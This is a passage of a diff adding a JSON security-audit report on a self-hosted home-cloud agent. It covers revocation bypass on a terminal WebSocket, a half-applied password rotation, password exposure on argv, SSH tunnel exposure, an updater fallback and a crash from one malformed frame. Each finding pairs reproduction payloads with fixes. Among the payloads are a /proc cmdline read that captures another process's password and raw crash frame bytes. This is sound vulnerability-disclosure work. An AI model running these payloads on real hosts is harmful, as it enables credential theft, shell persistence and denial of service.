+        "description": "Documented guarantee: logout and log out everywhere reject old JWTs on HTTP and WebSocket."
+      },
+      {
+        "file": "agents/v3/artifacts/result_1.txt",
+        "line": 8,
+        "description": "Independent sandbox run: after logout-all the old cookie gets 401 on /api/auth/me and /api/metrics and a new /terminal WS is closed, but the original WS stays OPEN and executes echo POST_$((200+2))."
+      },
+      {
+        "file": "agents/v3/artifacts/result_1.txt",
+        "line": 16,
+        "description": "Same result after POST /api/settings/password (sessionEpoch 3): original WS still executes commands on the host PTY."
+      },
+      {
+        "file": "agents/hb/artifacts/result_1.txt",
+        "line": 8,
+        "description": "Hunter's prior run showing the same post-logout-all execution."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "authentication_level",
+        "description": "Attacker previously obtained a valid session cookie (stolen cookie, shared/unattended device, or a session the owner wants to kill) and opened a /terminal WebSocket before revocation."
+      },
+      {
+        "kind": "timing_dependency",
+        "description": "The attacker's WebSocket must remain connected at the moment the owner revokes; a disconnected attacker cannot reconnect with the revoked cookie."
+      },
+      {
+        "kind": "user_interaction",
+        "description": "The owner performs logout, logout-all or a password change expecting it to evict the other session."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Holder of a once-valid owner session cookie with an open host terminal WebSocket, after the owner has revoked all sessions.",
+      "payloads": [
+        "WS ws://127.0.0.1:<port>/terminal?sessionId=v3logout_all  (Origin: http://127.0.0.1:<port>, Cookie: token=<old>)",
+        "POST /api/auth/logout-all  (owner action)",
+        "POST /api/settings/password {\"currentPassword\":\"dummy-password-123\",\"newPassword\":\"dummy-new-password-456\"}  (owner action)",
+        "echo POST_$((200+2))\\r  sent on the original socket"
+      ],
+      "instructions": [
+        "Load agent/index.js in-process inside the bwrap sandbox with dummy PASSWORD/JWT_SECRET, BASE_DIR=/scratch, HOME_CLOUD_CONFIG_DIR=/scratch/cfg, AGENT_ENV_FILE=/scratch/agent.env and listen on 127.0.0.1:0.",
+        "Log in, open /terminal WebSocket with the cookie and matching Origin, send a resize and a marker command, confirm output.",
+        "Call POST /api/auth/logout-all with the same cookie; confirm the old cookie now gets 401 over HTTP and a fresh /terminal WS is closed.",
+        "Send another marker command on the original socket and observe it executes.",
+        "Repeat with a fresh login and POST /api/settings/password as the revocation step."
+      ],
+      "observed_result": "For both logout-all (epoch 2) and password change (epoch 3): old cookie 401 on /api/auth/me and /api/metrics, new WS with old cookie closed, original WS readyState=1 and the post-revocation marker command output POST_202 was returned from the host shell."
+    },
+    "remediation": {
+      "strategy": "Track open WebSocket connections together with the epoch they were authorized under, and when incrementSessionEpoch runs (logout, logout-all, password change) close every socket with a stale epoch and destroy its PTY / container exec stream. As defense in depth, re-check the epoch in the message handlers before writing to the PTY or exec stream.",
+      "code_changes": [
+        {
+          "file_name": "agent/services/preferences.js",
+          "fixed_code": "const EventEmitter = require(\"events\");\nconst epochEvents = new EventEmitter();\n\nfunction incrementSessionEpoch() {\n    const currentEpoch = getSessionEpoch();\n    const newEpoch = currentEpoch + 1;\n    updatePreferences({ sessionEpoch: newEpoch });\n    epochEvents.emit(\"revoked\", newEpoch);\n    return newEpoch;\n}\n// export epochEvents alongside the existing functions"
+        },
+        {
+          "file_name": "agent/sockets/terminal.js",
+          "fixed_code": "// in handleSystemTerminal after successful verification:\nconst authEpoch = decoded.epoch;\nconst onRevoked = (newEpoch) => {\n    if (newEpoch !== authEpoch) {\n        try { session.kill(); } catch {}\n        ws.close(4401, \"Session revoked\");\n    }\n};\npreferences.epochEvents.on(\"revoked\", onRevoked);\nws.on(\"close\", () => preferences.epochEvents.off(\"revoked\", onRevoked));\n\nws.on(\"message\", (data) => {\n    if (preferences.getSessionEpoch() !== authEpoch) {\n        ws.close(4401, \"Session revoked\");\n        return;\n    }\n    // ...existing handling...\n});\n// apply the same pattern in agent/sockets/containerExec.js and end the exec stream"
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "low",
+        "reason": "Requires a previously stolen/leftover valid cookie and a WebSocket that is already open at the moment the owner revokes; the attacker cannot reconnect afterwards."
+      },
+      "impact": {
+        "score": "high",
+        "reason": "Fully defeats the documented revocation control for the most privileged channel: the retained socket is a host shell (root-equivalent via the docker group) that persists until the attacker disconnects or the service restarts."
+      },
+      "overall_severity": "medium"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Every cited source line re-read; independently reproduced in the approved sandbox for both logout-all and password change with dummy secrets; containerExec shares the identical connect-time-only check by source inspection."
+    }
+  },
+  {
+    "fingerprint": "home-cloud/settings/password-rotation-epoch-persist-failure",
+    "title": "Password rotation rewrites the credential, returns 500 and leaves every existing session valid when the session-epoch file cannot be written",
+    "description": "POST /api/settings/password changes the credential before it revokes sessions. updateEnvPassword() rewrites agent/.env and process.env.PASSWORD is swapped at settings.js:342; only then is incrementSessionEpoch() called. That call persists through preferences.updatePreferences(), which writes and renames preferences.json. When that write fails - read-only or remounted home, ENOSPC, EACCES, or a preferences.json left owned by an earlier root run - the throw reaches the route's catch, which returns HTTP 500 and skips clearAuthCookie. The password has nevertheless changed: the old password stops working, the new one works. The epoch was never bumped, so every token issued before the rotation still satisfies decodedtoken.epoch === getSessionEpoch() in agent/middleware/auth.js and keeps authorizing the full /api surface, including the host PTY and Docker control, for the rest of its 7-day lifetime. The operator is told the request failed, cannot retry with the old password, and has no signal that the sessions they were trying to evict are still live.",
+    "root_cause": "The two halves of credential rotation are applied in the wrong order and without rollback: agent/routes/settings.js:340-344 performs the irreversible .env and process.env mutation first and the revocation second, and the catch at settings.js:351-353 neither restores the previous credential nor forces a fail-closed revocation. Because preferences.updatePreferences() (services/preferences.js:158-162) can throw on its own fs.writeFileSync/renameSync, a persistence failure produces a half-applied rotation with the security-relevant half missing.",
+    "intended_behavior": "Either both halves apply or neither does. If the session epoch cannot be persisted, the credential must not be rotated and the response must say nothing changed; if the credential is rotated, every pre-existing session must be invalid on the next request.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "agent/routes/settings.js",
+        "line": 310,
+        "scope": "POST /api/settings/password",
+        "description": "Authenticated owner submits currentPassword and newPassword behind the /api auth middleware."
+      },
+      {
+        "kind": "propagation",
+        "file": "agent/routes/settings.js",
+        "line": 340,
+        "scope": "updateEnvPassword()",
+        "description": "Writes the new password into AGENT_ENV_FILE/.env (staged at 0600, renamed at settings.js:113-118). Irreversible from here on."
+      },
+      {
+        "kind": "propagation",
+        "file": "agent/routes/settings.js",
+        "line": 342,
+        "scope": "process.env.PASSWORD",
+        "description": "The live credential is replaced in memory, so the old password stops authenticating immediately."
+      },
+      {
+        "kind": "propagation",
+        "file": "agent/routes/settings.js",
+        "line": 343,
+        "scope": "incrementSessionEpoch()",
+        "description": "Revocation is only attempted after the credential has already changed; there is no compensating action if it fails."
+      },
+      {
+        "kind": "propagation",
+        "file": "agent/services/preferences.js",
+        "line": 161,
+        "scope": "updatePreferences()",
+        "description": "fs.writeFileSync of the new sessionEpoch throws (EACCES/ENOSPC/read-only), so inMemoryPreferences and preferences.json keep the old epoch and incrementSessionEpoch propagates the error."
+      },
+      {
+        "kind": "propagation",
+        "file": "agent/routes/settings.js",
+        "line": 352,
+        "scope": "route catch",
+        "description": "Returns HTTP 500, skips clearAuthCookie at settings.js:344, and leaves .env and process.env.PASSWORD holding the new value."
+      },
+      {
+        "kind": "sink",
+        "file": "agent/middleware/auth.js",
+        "line": 12,
+        "scope": "check()",
+        "description": "Pre-rotation tokens still equal the unchanged epoch, so they continue to authorize every /api route until the JWT expires."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "agents/gv5/artifacts/result_1.txt",
+        "line": 5,
+        "description": "Verifier sandbox reproduction: with config dir chmod 0500, POST /api/settings/password returns 500, PASSWORD is changed in agent.env, sessionEpoch remains 1, and pre-rotation token returns 200 on /api/auth/me; control with writable dir returns 200, increments epoch to 2, and revokes pre-rotation token."
+      },
+      {
+        "file": "agent/routes/settings.js",
+        "line": 340,
+        "description": "updateEnvPassword(envPath, trimmedNewPassword) runs before any revocation step."
+      },
+      {
+        "file": "agent/routes/settings.js",
+        "line": 343,
+        "description": "const newEpoch = incrementSessionEpoch() is the only revocation, and it is not guarded or compensated."
+      },
+      {
+        "file": "agent/routes/settings.js",
+        "line": 351,
+        "description": "The catch returns 500 for any error, including one raised after the credential was already rewritten."
+      },
+      {
+        "file": "agent/services/preferences.js",
+        "line": 161,
+        "description": "The epoch is persisted with fs.writeFileSync on preferences.json, a call that can fail on a read-only, full or newly-unwritable config directory."
+      },
+      {
+        "file": "agent/services/preferences.js",
+        "line": 188,
+        "description": "incrementSessionEpoch() turns that write failure into a thrown error, so the epoch is never advanced."
+      },
+      {
+        "file": "agent/middleware/auth.js",
+        "line": 12,
+        "description": "Authorization is decided by decodedtoken.epoch === preferences.getSessionEpoch(), which still matches the pre-rotation tokens."
+      },
+      {
+        "file": "agent/routes/auth.js",
+        "line": 175,
+        "description": "Tokens embed the epoch at login time, which is why an unchanged epoch keeps old sessions valid."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "environmental_dependency",
+        "description": "preferences.json under HOME_CLOUD_CONFIG_DIR (default ~/.config/home-cloud) is not writable at the moment of rotation: ENOSPC, a read-only or remounted home, a dropped permission bit, or a file left owned by an earlier root/sudo run of the agent."
+      },
+      {
+        "kind": "data_state",
+        "description": "An attacker already holds a valid token cookie issued before the rotation; the rotation is the owner's attempt to evict it."
+      },
+      {
+        "kind": "authentication_level",
+        "description": "The caller is the authenticated owner - the only principal that can reach /api/settings/password."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "The attacker does nothing after stealing a session cookie. The owner rotates the password to evict them, the rotation half-fails, and the stolen cookie keeps working against the host terminal and Docker control.",
+      "payloads": [
+        "POST /api/settings/password {\"currentPassword\":\"dummy-password-123\",\"newPassword\":\"new-secret-pass-123\"} with a valid token cookie while HOME_CLOUD_CONFIG_DIR is chmod 0500",
+        "GET /api/auth/me with the token cookie captured before the rotation",
+        "POST /api/auth/login {\"password\":\"new-secret-pass-123\"} and {\"password\":\"dummy-password-123\"}"
+      ],
+      "instructions": [
+        "Set PASSWORD=dummy-password-123, JWT_SECRET=dummy-jwt-secret-0123456789abcdef, BASE_DIR=/scratch, HOME_CLOUD_CONFIG_DIR=/scratch/cfg, AGENT_ENV_FILE=/scratch/agent.env and load the real agent in-process on 127.0.0.1:0 (dummy values only).",
+        "Log in, keep the token cookie, and make /scratch/cfg non-writable (chmod 0500) to model a full disk or a read-only config directory.",
+        "POST /api/settings/password with the correct current password and a new one; then read /scratch/agent.env, try logging in with both passwords, read getSessionEpoch(), and replay the original cookie against /api/auth/me.",
+        "Restore the directory to 0700 and repeat the rotation as a control to confirm that a successful write does revoke both tokens."
+      ],
+      "observed_result": "500 {\"error\":\"EACCES: permission denied, open '/scratch/cfg/preferences.json.<ts>.tmp'\"}; .env on disk held PASSWORD=\"new-secret-pass-123\"; login with the new password returned 200 and with the old password 401; epoch stayed 1; no Set-Cookie on the response; GET /api/auth/me with the pre-rotation cookie returned 200 {\"authorized\":true,\"user\":{\"epoch\":1,...}}. Control run with the directory writable: 200 with sessionEpoch 2 and both pre-rotation tokens returned 401 \"Session has been revoked\"."
+    },
+    "remediation": {
+      "strategy": "Persist the revocation first and treat it as the gate: if the epoch (or a dedicated session-version record) cannot be written, refuse the rotation and change nothing. Only after the revocation is durable may the credential be rewritten, and the response must state which halves were applied. The same ordering already protects /logout and /logout-all, which cannot leave a mutated credential behind.",
+      "code_changes": [
+        {
+          "file_name": "agent/routes/settings.js",
+          "fixed_code": "// 1. Revoke first: if this cannot be persisted, nothing else happens.\nlet newEpoch;\ntry {\n\tnewEpoch = incrementSessionEpoch();\n} catch (revokeErr) {\n\treturn res.status(503).json({\n\t\terror: `Refusing to change the password because session revocation could not be persisted (${revokeErr.message}). Nothing was changed.`,\n\t});\n}\n\n// 2. Only now rewrite the credential. A failure here leaves every session revoked, which is fail-closed.\ntry {\n\tupdateEnvPassword(envPath, trimmedNewPassword);\n} catch (writeErr) {\n\treturn res.status(500).json({\n\t\terror: `Session revocation was applied but the password was NOT changed: ${writeErr.message}`,\n\t});\n}\n\nprocess.env.PASSWORD = trimmedNewPassword;\nclearAuthCookie(res, req);\n\nreturn res.json({\n\tsuccess: true,\n\tmessage: \"Password updated successfully. All sessions revoked.\",\n\tsessionEpoch: newEpoch,\n});"
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "low",
+        "reason": "Requires the preferences write to fail at exactly that moment (full disk, read-only or remounted home, or a preferences.json that a previous root run left unwritable) plus a session the owner is actively trying to evict."
+      },
+      "impact": {
+        "score": "medium",
+        "reason": "A session that the owner believes was revoked keeps full root-equivalent control - host PTY and Docker socket - for the rest of its 7-day life, and the 500 response actively misleads the owner about the state of the credential."
+      },
+      "overall_severity": "low"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "The ordering is plainly visible in source and the full half-applied rotation was reproduced end to end against the real agent; only the frequency of the underlying write failure is environmental."
+    },
+    "verdict": "confirmed"
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "home-cloud/setup/password-on-argv",
+    "title": "Installer takes the dashboard admin password on the command line, where other local users can read it",
+    "description": "setup.sh accepts the admin password as -p/--password <pw>, --password=<pw>, or -p=<pw>. The README's automation example passes it this way through 'curl ... | bash -s -- --password ...'. The bash process keeps that argv for the whole install, including git clone, pnpm install, and the dashboard build, and /proc/<pid>/cmdline is mode 0444. On a default /proc mount without hidepid, any other local user can read the password. If the command runs under sudo, it is also written to sudo's auth log. The script already passes the password to its node helper through the environment (setup.sh:1560-1561), so it only leaks at the top-level argv.",
+    "root_cause": "A secret is accepted through process arguments, and the documentation recommends doing so.",
+    "intended_behavior": "The admin password should be supplied only through channels other local users cannot read: the HOME_CLOUD_PASSWORD environment variable (setup.sh:15), a prompt, stdin, or a 0600 file.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "setup.sh",
+        "line": 81,
+        "scope": "CLI flag parsing loop",
+        "description": "The -p|--password case takes the next argv element as the password (line 86). The --password= and -p= forms are at lines 89-96."
+      },
+      {
+        "kind": "propagation",
+        "file": "README.md",
+        "line": 151,
+        "scope": "Non-Interactive & Automation Flags",
+        "description": "The documented example passes --password \"YourStrongPassword123\" on the bash command line."
+      },
+      {
+        "kind": "sink",
+        "file": "setup.sh",
+        "line": 1698,
+        "scope": "admin password configuration",
+        "description": "The argv-supplied password becomes the dashboard PASSWORD written to agent/.env. The same value stays visible in the still-running bash process's /proc/<pid>/cmdline."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "setup.sh",
+        "line": 32,
+        "description": "The help text advertises -p, --password <password> as the dashboard admin password."
+      },
+      {
+        "file": "setup.sh",
+        "line": 15,
+        "description": "A safer HOME_CLOUD_PASSWORD environment alternative already exists."
+      },
+      {
+        "file": "setup.sh",
+        "line": 1561,
+        "description": "The installer avoids argv for its node helper by passing HOME_CLOUD_NEW_PASSWORD through the environment, which shows argv exposure is meant to be avoided."
+      },
+      {
+        "file": "agents/gv2/artifacts/result_2.txt",
+        "line": 2,
+        "description": "Sandbox run of the real setup.sh --dry-run --non-interactive --password dummy-password-123: a separate observer process read /proc/<pid>/cmdline, which contained the dummy password as an argv element. The file was mode 444 (line 3). The host /proc mount options were rw,nosuid,nodev,noexec,noatime, with no hidepid."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "user_interaction",
+        "description": "The owner runs setup.sh with -p/--password, as the README automation example shows."
+      },
+      {
+        "kind": "system_configuration",
+        "description": "Another local unprivileged user or process exists on the host and /proc is mounted without hidepid (the distro default). For the sudo-log variant, the reader needs access to the auth log or journal (adm or systemd-journal group)."
+      },
+      {
+        "kind": "timing_dependency",
+        "description": "argv is readable only while setup.sh runs, but a real install runs for minutes (dependency install and build)."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Another unprivileged local OS user on the host who polls /proc while the owner installs.",
+      "payloads": [
+        "bash setup.sh --non-interactive --password dummy-password-123",
+        "tr '\\0' ' ' < /proc/<setup-pid>/cmdline"
+      ],
+      "instructions": [
+        "In the sandbox, start bash /target/setup.sh --dry-run --non-interactive --password dummy-password-123 in the background (agents/gv2/scratch/verify_c8.sh).",
+        "From a separate observer in the same /proc namespace, read /proc/<pid>/cmdline and stat its mode.",
+        "Check whether the dummy password appears as an argv element."
+      ],
+      "observed_result": "argv was [bash] [/target/setup.sh] [--dry-run] [--non-interactive] [--password] [dummy-password-123], and cmdline mode was 444. The observer ran as the same uid in the sandbox. Cross-uid readability follows from mode 0444 and the absence of hidepid on the host /proc mount, but a second uid was not exercised."
+    },
+    "remediation": {
+      "strategy": "Remove --password from the README examples and recommend HOME_CLOUD_PASSWORD=... in the environment, the interactive prompt, or a new --password-file <0600 path> / --password-stdin option. Keep -p/--password only for compatibility, and print a warning that the value is visible to other local users, or remove it in the next major version.",
+      "code_changes": [
+        {
+          "file_name": "setup.sh",
+          "fixed_code": "        --password-file)\n            if [ -z \"${2:-}\" ] || [ ! -r \"$2\" ]; then\n                echo \"❌ Error: --password-file requires a readable file.\" >&2\n                exit 1\n            fi\n            IFS= read -r ADMIN_PASS_INPUT < \"$2\"\n            shift 2\n            ;;\n        -p|--password)\n            echo \"⚠️  Warning: --password is visible to other local users via /proc; prefer HOME_CLOUD_PASSWORD or --password-file.\" >&2\n            # ... existing handling ...\n            ;;"
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "low",
+        "reason": "Needs a second, lower-trust local account or process on a single-owner home server, active during the install window or able to read sudo logs."
+      },
+      "impact": {
+        "score": "medium",
+        "reason": "Discloses the dashboard admin password, which grants root-equivalent dashboard access. Rated medium rather than high because of the narrow exposure window and the local precondition."
+      },
+      "overall_severity": "low"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "The source is unambiguous and the argv exposure was reproduced with the real setup.sh. Only the cross-uid read is inferred from file mode and mount options."
+    }
+  },
+  {
+    "verdict": "needs_validation",
+    "fingerprint": "home-cloud/setup/ssh-tunnel-ingress-without-access",
+    "title": "Installer publishes host sshd at ssh.<domain> through Cloudflare Tunnel without creating any Cloudflare Access policy, and every tunnel client reaches sshd as 127.0.0.1",
+    "description": "With tunnel setup enabled, setup.sh writes the cloudflared ingress rule ssh.<domain> -> ssh://localhost:22 and routes public DNS for ssh.<domain>. It never creates a Cloudflare Access application or policy, and it does not harden sshd_config. setup_openssh only installs/enables the distro sshd with default settings, which on Debian/Ubuntu allow password authentication. Unless the owner separately adds an Access policy, anyone on the internet running `cloudflared access ssh --hostname ssh.<domain>` reaches the host's sshd. That sshd sees every tunnel client as a loopback peer, so source-address protections no longer apply per client: fail2ban/sshguard bans of 127.0.0.1, which are usually in ignoreip, Match Address rules, and OpenSSH PerSourcePenalties/MaxStartups attribution either never trigger or penalise all tunnel users, including the owner, together. The UI and README describe this as secure 'Zero Trust' access, but nothing in source enforces an identity check before sshd.",
+    "claimed_root_cause": "setup.sh (2063-2072, 2102-2109) exposes ssh://localhost:22 on a public hostname via the tunnel. It never adds a Cloudflare Access application/policy, or service-token/identity requirement, in front of it, and never restricts sshd authentication. The tunnel makes all remote clients indistinguishable loopback peers to sshd.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "setup.sh",
+        "line": 2070,
+        "scope": "Cloudflare tunnel config generation",
+        "description": "Ingress rule hostname ssh.$CF_DOMAIN_VAL is written to ~/.cloudflared/config.yml."
+      },
+      {
+        "kind": "propagation",
+        "file": "setup.sh",
+        "line": 2103,
+        "scope": "Cloudflare tunnel DNS routing",
+        "description": "cloudflared tunnel route dns --overwrite-dns publishes ssh.<domain> as a public CNAME to the tunnel; no Access application/policy step follows."
+      },
+      {
+        "kind": "sink",
+        "file": "setup.sh",
+        "line": 2071,
+        "scope": "Cloudflare tunnel config generation",
+        "description": "Service ssh://localhost:22: cloudflared on the host connects to sshd from loopback for every remote tunnel client."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "setup.sh",
+        "line": 1048,
+        "description": "setup_openssh enables/installs the distro sshd and never touches sshd_config (no PasswordAuthentication/PermitRootLogin hardening) in lines 1033-1071."
+      },
+      {
+        "file": "setup.sh",
+        "line": 2421,
+        "description": "The post-install instructions give only 'ProxyCommand cloudflared access ssh --hostname %h' and do not tell the owner to create an Access policy."
+      },
+      {
+        "file": "dashboard/src/components/apps/SettingsApp.tsx",
+        "line": 1072,
+        "description": "The UI describes the path as connecting 'securely ... from anywhere in the world', implying protection that source does not configure."
+      },
+      {
+        "file": "agent/services/ingress.js",
+        "line": 221,
+        "description": "ssh.<domain> is filtered out of the dashboard's exposed-app list, so the owner never sees this public ingress listed as exposed."
+      }
+    ],
+    "blockers": [
+      "Whether the owner's Cloudflare account has a Cloudflare Access application/policy covering ssh.<domain>. That is account-side configuration, not source-visible, and it decides whether unauthenticated internet clients reach sshd at all.",
+      "The effective sshd authentication configuration on the deployed host: whether PasswordAuthentication or KbdInteractiveAuthentication is enabled, and the OpenSSH version/PerSourcePenalties settings. This decides whether reachability lets remote password guessing happen without per-source throttling."
+    ],
+    "validation_plan": {
+      "local": "In a disposable VM or container with no external network: install openssh-server with distro defaults, run `sshd -T | rg -i 'passwordauthentication|kbdinteractive|persourcepenalt|maxstartups'`, and make several failed logins from 127.0.0.1 to see how fail2ban (default ignoreip) and PerSourcePenalties attribute loopback-sourced failures. Do not use a real tunnel.",
+      "deployment": "Owner check, no audit traffic: in Cloudflare Zero Trust dashboard > Access > Applications, confirm whether a self-hosted application covers ssh.<domain> with an identity policy. On the host, run `sudo sshd -T | rg -i 'passwordauthentication|kbdinteractiveauthentication|permitrootlogin'` and review `journalctl -u ssh` for authentication attempts from 127.0.0.1 that the owner did not make."
+    }
+  },
+  {
+    "verdict": "needs_validation",
+    "fingerprint": "home-cloud/updater/unfrozen-install-fallback",
+    "title": "Auto-updater falls back to non-frozen pnpm install on any frozen-lockfile failure",
+    "description": "applyUpdate checks out a release tag and runs `pnpm install --frozen-lockfile`; any failure (lockfile out of sync with manifests, lockfile/settings mismatch, transient error) is swallowed and a plain `pnpm install` runs, which may re-resolve semver ranges from the registry and rewrite the lockfile, after which the dashboard is built and the service restarted as the service user (docker group, root-equivalent). This removes the lockfile pin exactly when it diverges, letting a third-party npm publisher's newly published in-range version execute on the host. Whether that state is reachable depends on release-process facts outside the repository.",
+    "claimed_root_cause": "agent/services/updateManager.js:443-458 catches every frozen-install failure and retries without --frozen-lockfile instead of aborting and rolling back, so the reproducibility/integrity guarantee of the lockfile is dropped silently.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "agent/services/updateManager.js",
+        "line": 434,
+        "scope": "applyUpdate",
+        "description": "git checkout --detach <release tag> fetched from origin (owner-triggered update)."
+      },
+      {
+        "kind": "propagation",
+        "file": "agent/services/updateManager.js",
+        "line": 444,
+        "scope": "applyUpdate stage 4",
+        "description": "pnpm install --frozen-lockfile; any error enters the catch."
+      },
+      {
+        "kind": "propagation",
+        "file": "agent/services/updateManager.js",
+        "line": 454,
+        "scope": "applyUpdate stage 4 catch",
+        "description": "Unconditional retry with plain pnpm install (registry re-resolution allowed)."
+      },
+      {
+        "kind": "sink",
+        "file": "agent/services/updateManager.js",
+        "line": 486,
+        "scope": "applyUpdate stage 6",
+        "description": "Build then detached service restart runs the newly installed dependency code on the host."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "agent/services/updateManager.js",
+        "line": 448,
+        "description": "catch (_) discards the frozen-install error reason; no rollback to rollbackCommit on lockfile mismatch."
+      },
+      {
+        "file": ".github/workflows/ci.yml",
+        "line": 4,
+        "description": "CI (which enforces --frozen-lockfile at :45/:72/:99) runs only on pushes to main/t3 branches and PRs, not on tag pushes, so a tag on an unchecked commit is not prevented by source-visible controls."
+      },
+      {
+        "file": "pnpm-lock.yaml",
+        "line": 1,
+        "description": "lockfileVersion 9.0 pinned to pnpm 12.15.0 (packageManagerDependencies), so a host pnpm mismatch could also make the frozen install fail."
+      },
+      {
+        "file": "agents/hc/artifacts/result_2.txt",
+        "line": 9,
+        "description": "Mocked runCommand run: frozen install failure followed by plain pnpm install, build and successful restart."
+      },
+      {
+        "file": "agents/gv1/artifacts/result_3.txt",
+        "line": 9,
+        "description": "Verifier sandbox reproduction with mocked runCommand: pnpm install --frozen-lockfile failure is caught and falls back to plain pnpm install, building dashboard and restarting (lines 8-10, 16)."
+      }
+    ],
+    "blockers": [
+      "Whether release tags on Cypher0071/Home_Cloud can point at commits whose pnpm-lock.yaml does not satisfy the manifests or pnpm settings (release-process fact; CI does not run on tags).",
+      "Whether pnpm 12.15 non-frozen install in that state actually re-resolves to a newer registry version than the lockfile pin (needs registry access, unavailable offline)."
+    ],
+    "validation_plan": {
+      "local": "In a disposable copy of the repo with a local verdaccio registry holding dummy package v3-probe@1.0.0 and 1.0.1: pin 1.0.0 in pnpm-lock.yaml, set the manifest to ^1.0.0 plus one unrelated manifest edit so the lockfile is out of sync, run applyUpdate with skipRestart and NODE_ENV=test pointing at that copy, and check whether node_modules/v3-probe resolves to 1.0.1.",
+      "deployment": "Owner checks, for each published v* tag, whether `pnpm install --frozen-lockfile --lockfile-only` succeeds at that tag (CI or local clone, no updater run), and whether update logs on hosts ever show 'Retrying dependency install with pnpm install...'."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "home-cloud/websocket/unauthenticated-frame-error-crash",
+    "title": "One malformed WebSocket frame from an unauthenticated client kills the agent process and its tunnel",
+    "description": "The WebSocket server is constructed on the shared HTTP server (agent/index.js:23) and accepts every upgrade before any application check. The connection handler rejects a foreign Origin with close(1008) (line 41), and both handlers require a cookie JWT (agent/sockets/terminal.js:343-378, agent/sockets/containerExec.js:8-46), but none of them registers an 'error' listener on the socket. The ws library (v8.22.0) reports protocol violations by emitting 'error' on the WebSocket (agent/node_modules/ws/lib/websocket.js:1232). EventEmitter throws when 'error' has no listener, so a masked frame with the RSV1 bit set, an unmasked frame, or an oversized payload raises an uncaught exception and Node exits. No cookie is required: the frame can be sent on an upgrade the agent already rejected as cross-origin, because close(1008) only starts a close handshake and the socket keeps receiving frames. Direct access to port 3000 on all LAN interfaces allows any adjacent network client to send the fatal frame. In production, systemd restarts the service after 5 s, but five crashes in under 60 s trigger StartLimitBurst=5 in home-cloud.service.template, leaving the service in a persistent failed state until manual operator intervention.",
+    "root_cause": "The application does not subscribe to the 'error' event on WebSocket objects it accepts, and has no process-level uncaughtException handler. The ws library turns peer-supplied protocol violations into an emitted 'error' event, and an unhandled EventEmitter 'error' event causes Node.js to throw and exit, allowing any client that can complete a WebSocket upgrade to terminate the host agent process with one frame.",
+    "intended_behavior": "A malformed frame must terminate only the offending connection with a protocol-error close, without emitting an unhandled error or affecting the agent process, other active sessions, the updater, or the tunnel.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "agent/index.js",
+        "line": 23,
+        "scope": "const wss = new WebSocketServer({ server })",
+        "description": "ws handles the HTTP server's upgrade event for every path with default options; no server-level upgrade validation rejects the connection before a WebSocket object is created."
+      },
+      {
+        "kind": "propagation",
+        "file": "agent/index.js",
+        "line": 28,
+        "scope": "wss.on(\"connection\", (socket, request) => {",
+        "description": "The only connection listener performs shutdown, Origin, and path checks and then dispatches, but never attaches an 'error' listener to the accepted socket."
+      },
+      {
+        "kind": "propagation",
+        "file": "agent/index.js",
+        "line": 41,
+        "scope": "socket.close(1008, \"Origin rejected\")",
+        "description": "A rejected cross-origin socket is not destroyed; close() starts a close handshake, so the peer can continue sending frames until the handshake completes or the default closeTimeout expires."
+      },
+      {
+        "kind": "propagation",
+        "file": "agent/sockets/terminal.js",
+        "line": 347,
+        "scope": "handleSystemTerminal: if (!token) { ws.close(); return; }",
+        "description": "With a matching Origin but no cookie, the terminal handler also only closes the socket; no 'error' listener is registered on this path either."
+      },
+      {
+        "kind": "sink",
+        "file": "agent/node_modules/ws/lib/websocket.js",
+        "line": 1232,
+        "scope": "receiverOnError",
+        "description": "A protocol violation in the receiver makes ws emit 'error' on the WebSocket. With no listener, EventEmitter throws and the uncaught exception exits the process."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "agent/index.js",
+        "line": 23,
+        "description": "The WebSocketServer is created over the shared HTTP server with no server.on('upgrade') pre-check and no per-socket error handler."
+      },
+      {
+        "file": "agent/index.js",
+        "line": 41,
+        "description": "Every non-matching Origin takes this close-only path; close() begins a close handshake but does not destroy the socket, so it remains readable."
+      },
+      {
+        "file": "agent/sockets/terminal.js",
+        "line": 347,
+        "description": "The no-cookie path calls ws.close() and returns without registering a socket 'error' listener."
+      },
+      {
+        "file": "agent/node_modules/ws/package.json",
+        "line": 3,
+        "description": "The installed ws dependency is pinned at version 8.22.0."
+      },
+      {
+        "file": "agent/node_modules/ws/lib/websocket.js",
+        "line": 1232,
+        "description": "receiverOnError emits 'error' on the WebSocket for protocol violations; ws attaches receiver and raw-socket listeners but not a WebSocket 'error' listener."
+      },
+      {
+        "file": "home-cloud.service.template",
+        "line": 7,
+        "description": "StartLimitBurst=5 with StartLimitIntervalSec=60s causes systemd to leave the unit in a persistent failed state after 5 successive crashes."
+      },
+      {
+        "file": "agents/gv4/artifacts/result_1.txt",
+        "line": 4,
+        "description": "Control: normal WebSocket upgrade without a malformed frame kept the stock Node.js process alive."
+      },
+      {
+        "file": "agents/gv4/artifacts/result_1.txt",
+        "line": 6,
+        "description": "Foreign-Origin upgrade returned 101, server sent 1008 'Origin rejected', and masked RSV1 frame c18001020304 caused stock Node.js to exit with code 1 and 'Symbol(status-code): 1002'."
+      },
+      {
+        "file": "agents/gv4/artifacts/result_1.txt",
+        "line": 8,
+        "description": "Matching Origin without a cookie: 101, then unmasked frame 8100 caused stock Node.js to exit with code 1 and 'Symbol(status-code): 1002'."
+      },
+      {
